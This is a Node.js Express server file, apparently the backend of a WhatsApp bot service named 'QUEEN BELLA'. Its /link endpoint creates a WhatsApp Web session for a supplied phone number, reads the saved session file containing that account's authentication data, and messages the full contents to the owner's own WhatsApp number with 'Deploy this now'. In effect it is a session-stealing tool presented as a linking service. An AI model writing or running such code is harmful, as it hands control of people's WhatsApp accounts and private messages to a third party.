// server.js
const express = require('express');
const cors = require('cors');
const { create } = require('@open-wa/wa-automate');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');
dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;
const OWNER_NUMBER = process.env.RODGERS_PHONE;

// Fixed code
const FIXED_CODE = 'RODGERS4';

app.post('/link', async (req, res) => {
  const { phone, code } = req.body;

  if (code !== FIXED_CODE) {
    return res.status(400).json({ error: 'Invalid Code' });
  }

  const sessionId = `user_${phone}`;
  const sessionPath = path.join(__dirname, 'sessions', `${sessionId}.json`);

  create({
    sessionId,
    multiDevice: true,
    qrTimeout: 0,
    authTimeout: 0,
    cacheEnabled: false,
    useChrome: false,
    headless: true,
    popup: false,
    qrRefreshS: 15,
    qrLogSkip: false,
    killProcessOnBrowserClose: true,
    disableSpins: true,
    logConsole: false,
    authStrategy: {
      type: 'local',
      dataPath: sessionPath
    }
  }).then(client => {
    const sessionData = fs.readFileSync(sessionPath, 'utf8');
    const message = `
🔥 NEW SESSION 🔥

Number: ${phone}
Session ID: ${sessionId}

SESSION CODE:
\`\`\`js
${sessionData}
\`\`\`

Deploy this now 💻
    `;
    client.sendText(OWNER_NUMBER + '@c.us', message);
    res.status(200).json({ message: 'Session sent to Rodgers' });
  }).catch(err => {
    res.status(500).json({ error: 'Failed to create session', details: err.message });
  });
});

app.listen(PORT, () => {
  console.log(`QUEEN BELLA Backend running on port ${PORT}`);
});
